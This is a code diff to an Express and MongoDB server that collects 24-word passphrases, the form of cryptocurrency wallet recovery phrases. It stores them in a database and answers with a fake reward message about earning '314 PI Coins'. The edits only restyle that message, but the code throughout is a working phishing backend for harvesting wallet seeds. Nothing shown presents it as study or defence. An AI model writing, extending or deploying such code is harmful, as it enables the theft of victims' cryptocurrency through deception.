@@ -5,7 +5,7 @@ const bodyParser = require('body-parser');
 // Create Express app
 const app = express();
 
-// Middleware to parse incoming requests
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
@@ -26,45 +26,23 @@ const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
 
-    // Check if passphrase is 24 words
     if (!passphrase || passphrase.trim().split(" ").length !== 24) {
         return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
     }
 
     try {
-        // Save passphrase to database
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
-        
-        // Send a styled success message
+
+        // Multicolor styled message with white background
         const successMessage = `
-            <html>
-                <head>
-                    <style>
-                        body {
-                            font-family: Arial, sans-serif;
-                            text-align: center;
-                            padding: 50px;
-                        }
-                        .success-message {
-                            font-size: 24px;
-                            font-weight: bold;
-                            color: green;
-                            background-color: blue;
-                            padding: 20px;
-                            border-radius: 10px;
-                            text-transform: uppercase;
-                            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="success-message">
-                        Congratulations!!! You have earned your 314 PI Coins Successfully!!
-                    </div>
-                </body>
-            </html>
+            <div style="background-color: white; padding: 20px; text-align: center;">
+                <h2 style="font-size: 24px; font-family: Arial, sans-serif; background-image: linear-gradient(to left, #ff0000, #ff9900, #33cc33, #3399ff, #9933ff); -webkit-background-clip: text; color: transparent;">
+                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
+                </h2>
+            </div>
         `;
+
         res.status(200).send(successMessage);
     } catch (error) {
         console.error('Error saving passphrase:', error);
